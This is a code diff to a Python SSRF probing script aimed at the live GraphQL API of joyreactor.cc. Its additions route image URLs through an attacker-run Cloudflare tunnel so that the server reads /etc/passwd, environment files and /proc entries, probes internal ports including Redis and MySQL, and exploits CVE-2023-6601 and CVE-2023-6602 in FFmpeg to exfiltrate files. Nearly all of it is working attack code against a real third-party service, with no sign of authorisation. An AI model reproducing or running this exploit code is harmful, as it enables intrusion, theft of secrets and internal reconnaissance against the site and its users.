@@ -29,27 +29,39 @@ session.headers.update({
 
 URL = "https://api.joyreactor.cc/graphql"
 
+# Run with -v flag for full raw responses: python ssrf_probe.py files -v
+VERBOSE = "-v" in sys.argv
+
 # ─── CONFIGURE BEFORE USE ────────────────────────────────────────────────────
 WEBHOOK = "https://webhook.site/REPLACE_ME"   # your webhook.site UUID
-REDIRECT_SERVER = "http://YOUR_VPS:8080"      # for redirect-chain tests (optional)
+REDIRECT_SERVER = "https://calculations-taylor-extraction-medium.trycloudflare.com"
 # ─────────────────────────────────────────────────────────────────────────────
 
-def probe(label, url, delay=1.5):
+def probe(label, url, delay=1.5, verbose=VERBOSE):
     """Send one SSRF probe and return timing + status."""
-    body = {"query": f'mutation{{post(tags:[],text:{json.dumps(f"<img src={url}>")}){{post{{id}}}}}}'}
+    body = {"query": f'mutation{{post(tags:[],text:{json.dumps(f"<img src={url}>")}){{post{{id text}}}}}}'}
     t0 = time.monotonic()
     try:
         r = session.post(URL, json=body, timeout=15)
         elapsed = (time.monotonic() - t0) * 1000
-        d = r.json()
+        raw = r.text
+        try:
+            d = r.json()
+        except Exception:
+            d = {}
         p = ((d.get("data") or {}).get("post") or {}).get("post") or {}
         created = bool(p.get("id"))
-        err = (d.get("errors") or [{}])[0].get("message", "")[:60] if not created else ""
+        err = (d.get("errors") or [{}])[0].get("message", "")[:80] if not created else ""
         status = "CREATED" if created else f"blocked({err})"
+        if verbose:
+            print(f"  [{elapsed:6.0f}ms] {label}")
+            print(f"           HTTP {r.status_code} | raw: {raw[:300]}")
+        else:
+            print(f"  [{elapsed:6.0f}ms] {label:<40} {status}")
     except Exception as e:
         elapsed = (time.monotonic() - t0) * 1000
         status = f"error({e})"
-    print(f"  [{elapsed:6.0f}ms] {label:<40} {status}")
+        print(f"  [{elapsed:6.0f}ms] {label:<40} {status}")
     time.sleep(delay)
     return elapsed
 
@@ -60,7 +72,8 @@ def section(title):
     print(f"{'─'*60}")
 
 
-suite = sys.argv[1] if len(sys.argv) > 1 else "all"
+args = [a for a in sys.argv[1:] if not a.startswith("-")]
+suite = args[0] if args else "all"
 
 # ── 1. FILE:// — local file read ─────────────────────────────────────────────
 if suite in ("files", "all"):
@@ -187,5 +200,53 @@ if suite in ("hls", "all"):
         print("    #EXTM3U")
         print("    #EXT-X-MEDIA-SEQUENCE:0")
         print("    file:///etc/passwd")
+
+# ── 5. REDIRECT CHAIN — via ssrf_server.py ───────────────────────────────────
+# Requires: python3 ssrf_server.py + cloudflared tunnel --url http://localhost:8080
+if suite in ("redirect", "all"):
+    section("REDIRECT CHAIN — HTTP → file:// and internal ports via ssrf_server.py")
+    S = REDIRECT_SERVER
+    redirects = [
+        ("redir-file-passwd",       f"{S}/redirect/file"),
+        ("redir-file-env",          f"{S}/redirect/env"),
+        ("redir-file-env2",         f"{S}/redirect/env2"),
+        ("redir-file-env3",         f"{S}/redirect/env3"),
+        ("redir-file-hosts",        f"{S}/redirect/hosts"),
+        ("redir-file-proc",         f"{S}/redirect/proc"),
+        # port 3000 — enumerate paths to identify service
+        ("redir-3000-root",         f"{S}/redirect/3000"),
+        ("redir-3000-metrics",      f"{S}/redirect/3000-metrics"),
+        ("redir-3000-health",       f"{S}/redirect/3000-health"),
+        ("redir-3000-info",         f"{S}/redirect/3000-info"),
+        ("redir-3000-version",      f"{S}/redirect/3000-version"),
+        ("redir-3000-status",       f"{S}/redirect/3000-status"),
+        ("redir-3000-debug",        f"{S}/redirect/3000-debug"),
+        # port 3001
+        ("redir-3001-root",         f"{S}/redirect/3001"),
+        ("redir-3001-metrics",      f"{S}/redirect/3001-metrics"),
+        ("redir-3001-health",       f"{S}/redirect/3001-health"),
+        ("redir-port-redis",        f"{S}/redirect/redis"),
+        ("redir-port-mysql",        f"{S}/redirect/mysql"),
+        ("redir-hls-m3u8",          f"{S}/evil.m3u8"),
+    ]
+    for label, url in redirects:
+        probe(label, url, delay=2.0)
+    print(f"\n  Check server logs: {S}/log")
+
+# ── 6. CVE EXPLOITS ──────────────────────────────────────────────────────────
+if suite in ("cve", "all"):
+    section("CVE-2023-6601 / CVE-2023-6602 — HLS demuxer bypass + TTY exfiltration")
+    S = REDIRECT_SERVER
+    # First: get FFmpeg version via /proc/self/maps
+    probe("proc-maps",        f"{S}/redirect/maps",    delay=2.0)
+    probe("proc-version",     f"{S}/redirect/version", delay=2.0)
+    probe("proc-cmdline",     f"{S}/redirect/cmdline", delay=2.0)
+    # CVE-2023-6601: data URI bypass — nested m3u8 referencing file://
+    probe("cve6601-passwd",   f"{S}/cve-6601/file",    delay=2.0)
+    probe("cve6601-env",      f"{S}/cve-6601/env",     delay=2.0)
+    probe("cve6601-maps",     f"{S}/cve-6601/maps",    delay=2.0)
+    # CVE-2023-6602: TTY demuxer — .ans + file:// segments
+    probe("cve6602-passwd",   f"{S}/cve-6602/file",    delay=2.0)
+    probe("cve6602-env",      f"{S}/cve-6602/env",     delay=2.0)
 
 print("\n[done]")
